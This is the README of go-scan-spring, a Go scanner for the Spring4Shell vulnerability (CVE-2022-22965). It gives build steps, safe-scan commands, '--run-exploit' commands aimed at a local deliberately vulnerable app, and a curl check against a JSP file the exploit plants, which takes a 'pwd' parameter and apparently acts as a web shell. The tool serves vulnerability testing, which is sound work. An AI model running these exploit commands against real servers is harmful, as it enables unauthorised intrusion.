<h1 align="center">
  <br>
    go-scan-spring
  <br>
  <br>
</h1>

<h4 align="center">Vulnerability scanner to find Spring4Shell (CVE-2022-22965) vulnerabilities</h4>
<p align="center">For more information: <a href="https://www.fracturelabs.com/posts/effective-spring4shell-scanning-exploitation/">https://www.fracturelabs.com/posts/effective-spring4shell-scanning-exploitation/</a></p>
<p align="center">
  <a href="https://twitter.com/fracturelabs"><img src="https://img.shields.io/badge/twitter-%40fracturelabs-orange.svg" alt="@fracturelabs" height="18"></a>
  <a href="https://twitter.com/brkr19"><img src="https://img.shields.io/badge/twitter-%40brkr19-orange.svg" alt="@brkr19" height="18"></a>
</p>
<br>

# Build
```bash
git clone https://github.com/fracturelabs/go-scan-spring.git
cd go-scan-spring
```

# Usage
## Help
```bash
go run main.go help scan
```
## Basic safe scan
```bash
go run main.go scan --run-safe -f urls.txt
```

## Basic safe exploit
Use your own unique `identifier` parameter!

```bash
# Using HTTP GETs and POSTs
echo http://localhost:8080/spring4shell_victim/vulnerable | go run main.go scan -f - --identifier 550bafe0-0c6c-4f3e-a46b-0901c28e690b --run-exploit

# Using only HTTP GETs
echo http://localhost:8080/spring4shell_victim/vulnerable | go run main.go scan -f - --identifier 550bafe0-0c6c-4f3e-a46b-0901c28e690b --run-exploit --http-post=false

# Using only HTTP POSTs
echo http://localhost:8080/spring4shell_victim/vulnerable | go run main.go scan -f - --identifier 550bafe0-0c6c-4f3e-a46b-0901c28e690b --run-exploit --http-get=false
```

### Verification
You can verify the script works properly by testing against an intentionally vulnerable system, such as [spring4shell_victim](https://github.com/fracturelabs/spring4shell_victim)

```bash
curl --output - 'http://localhost:8080/go-scan-spring/550bafe0-0c6c-4f3e-a46b-0901c28e690b-AD.jsp?pwd=550bafe0-0c6c-4f3e-a46b-0901c28e690b'
```


# Credits
* The entire structure and several functions were borrowed heavily from the wonderful [GoWitness](https://github.com/sensepost/gowitness) project from SensePost.
* The safe check implemented in this was inspired by [The Randori Attack Team](https://twitter.com/RandoriAttack/status/1509298490106593283) and [Zach Grace](https://twitter.com/ztgrace)
* Whoever created the first PoC - stuff is moving too fast to properly attribute this right now!
